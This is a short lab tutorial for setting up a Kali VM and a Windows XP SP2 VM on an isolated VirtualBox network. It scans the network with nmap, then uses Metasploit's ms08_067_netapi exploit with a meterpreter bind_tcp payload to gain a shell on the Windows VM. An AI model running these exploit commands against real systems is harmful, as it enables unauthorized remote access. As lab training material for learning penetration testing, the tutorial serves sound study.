Boot / Install Kali

Install Windows XP service pack 2 on a virtualbox image, and boot it.

On both the Windows VM and the Kali VM (if using Kali in a VM) click Network Settings

Select Host-only Adapter and hit OK.

Note - if you get an "invalid setting" error, you need to go to VirtualBox -> Preferences -> Network -> Host-only Networks -> Add a new one there.

In Kali, run nmap:
```
nmap -sV 192.168.0-254.0-254
```

From this, find the victim IP address and insert it in the commands below in place of "192.168.0.103"

```shell
$ msfconsole
> use windows/smb/ms08_067_netapi
> show targets
> set target 0
> show options
> set RHOST 192.168.0.103
> show payloads
> set PAYLOAD windows/meterpreter/bind_tcp
> exploit
```


Troubleshooting
- It may fail if the windows firewall is turned on
- Sometimes after one failed attempt (due to bad target) the victim's service dies and has to be rebooted before another attempt is made.
